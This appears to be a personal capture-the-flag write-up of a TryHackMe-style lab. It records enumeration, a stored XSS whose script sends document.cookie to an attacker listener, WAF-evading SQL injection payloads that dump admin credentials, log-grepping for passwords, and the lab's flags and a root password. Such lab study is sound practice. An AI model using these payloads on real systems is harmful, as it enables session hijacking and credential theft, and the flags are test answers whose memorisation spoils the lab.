---
Status: "#In-prgress"
OS:
ip:
Start_Time: 2026-02-07 15:47
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	This time we only have a external site, so I started with a quick fully scan and verified that the target only has port 22 and 80 opened.
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
```

![](<assets/Pasted image 20260207163621.png>)
	Next, I followed with a detailed service scan and normal script scan for all ports. The results shows that the target has a Nginx web server and the relevant ssh host keys.

![](<assets/Pasted image 20260207163923.png>)
### 2.2 Directory enumeration
	Followed the service enumeration, I started gobuster and do a directory enumeration but nothing returned. So I used ffuf to do a virtual hosts enumeration.The results give me several possible hosts.
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.81.156.97/ -H "Host: FUZZ.k2.thm" -fs <content-length>
```

![](<assets/Pasted image 20260207180320.png>)

![](<assets/Pasted image 20260207180335.png>)

	
---

##  3. Initial access
### 3.1 XSS
	I tried to use XSS payload to test for petential xss vulnerabilties in the target it.k2.thm. In ticket submission place, it indeed has xss vulnerabilities.

![](<assets/Pasted image 20260208115601.png>)

```
# XSS payload
<script src="http://.../exploit.js"></script>
```
```
# exploit.js
fetch('http://IP:8888/?cookie=' + document.cookie);
```
	I used this payload and file to steal the cookie and success.

![](<assets/Pasted image 20260208120341.png>)
	After I decode the cookie, I tried to use to login. However, the cookie may be limited by some setting. I can't login with that cookie.

![](<assets/Pasted image 20260209190010.png>)
	So I first tried to use xss to view the content of the dashboard. And it returned.

![](<assets/Pasted image 20260221121201.png>)
	Remainder: Remember to change the "GET /" to "GET /dashboard"
	Now I can view the content of the dashboard.

![](<assets/Pasted image 20260221121308.png>)
### 3.2 Vulnerability identification
	After I login, I found a ticket which has some interesting information.

![](<assets/Pasted image 20260221142713.png>)
	I tried to use this number as password to ssh. But clearly it  is not the credential. Let's try other vulnerabilities. I noticed that here is also a submission area, which may be vulnerable to XSS or SQLI?
	I type a simple ' here and it returned 500 state code, which confirmed that there may be a sqli exists.
![](<assets/Pasted image 20260221143448.png>)
![](<assets/Pasted image 20260221143502.png>)
	This time I tried the boolean injection.
```
help' OR '1'='1
```
	But it returned "attack detection", which means I need to find a way to bypass WAF at backend.
	
![](<assets/Pasted image 20260221143734.png>)
```
help' UNION SELECT 1-- -
```
	However, when I tried union select and it is not detected but return 500 state code.
	So I can keep testing for possible columns. And when I tried the three columns numbers, it returned.

![](<assets/Pasted image 20260221144110.png>)
	Now I know exactly which number represents which columns.
```
' UNION SELECT 1, table_name, 3 FROM InFoRmAtIoN_sChEmA.tables WHERE table_schema=database()-- -
```
	I tried this payload to grab some information and it gives a lot to me.
	
![](<assets/Pasted image 20260221144923.png>)
	
```
' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='auth_users'-- -
```
	I first want to take a look at the auth_users, and the crednetials it may have.

![](<assets/Pasted image 20260221145046.png>)
	emmm.... The credential is auth_user is the username that I registered. Let's check admin.


![](<assets/Pasted image 20260221145217.png>)
	However, I tried to view the content of admin_auth. But it always returned 500, so may be I triggered the WAF. So I tried a test message and it returned, which means I cannot directly query the admin_auth because WAF will intercept me.
![](<assets/Pasted image 20260221145951.png>)
	So I tried to exchange the columns places.
```
‘ UNION SELECT email, admin_password, admin_username FROM admin_auth — -
```
	This time it returned 200 but doesn't contain any other information.

![](<assets/Pasted image 20260221150447.png>)
	So I tried to end the possible first query line in the backend and directly run the Union select.

```
' AND 1=0 UNION SELECT email, admin_password, admin_username FROM admin_auth-- -
```
	And this time I succeed.

![](<assets/Pasted image 20260221150616.png>)
	I have the credential. Actually there are two possible credentials. I tried the james first.

![](<assets/Pasted image 20260221150738.png>)
	SSH success. I also tey to ssh to rose, but permission denied.
![](<assets/Pasted image 20260221151221.png>)
	


##  4. Privilege Escalation

### 4.1 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [ ] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [ ] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).
	I tried sudo -l and cronjob, but both of them is not possible. Also, I check the home directory and there are two users.

![](<assets/Pasted image 20260221151859.png>)
	Next, I used id to check the groups and I found that james is in adm group, which means he can access the /var/log

![](<assets/Pasted image 20260221151957.png>)
	I check the log with this command.

```
find /var/log -type f -readable -exec grep -HniE "pass|pwd|login|token" {} + 2>/dev/null
```
![](<assets/Pasted image 20260221153438.png>)
	Here, I found a password. Let's test this.
```
Password:RdzQ7MSKt)fNaz3!
```
	This password can be used to login as root. However, this is not rose's password. I tried to su rose, but failed. Let's figure out rose's real password.

![](<assets/Pasted image 20260221153738.png>)
	I  cd to rose's directory and view the content of bash_history files. And I found he misplace the password in sudo su commands. This is rose's real password.

![](<assets/Pasted image 20260221155318.png>)
	Next, for the full names of two users, I used this command.

```
getent passwd james rose
```

![](<assets/Pasted image 20260221155421.png>)


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content (Hash)                   | Screenshot (Link)                           |
| :------------ | :------------------------------------ | :------------------------------------------ |
| **local.txt** | THM{9e04a7419a2b7a86163496271a8a95dd} | ![](<assets/Pasted image 20260221150850.png>) |
| **proof.txt** | THM{c6f684e3b1089cd75f205f93de9fe93d} | ![](<assets/Pasted image 20260221153841.png>) |

---

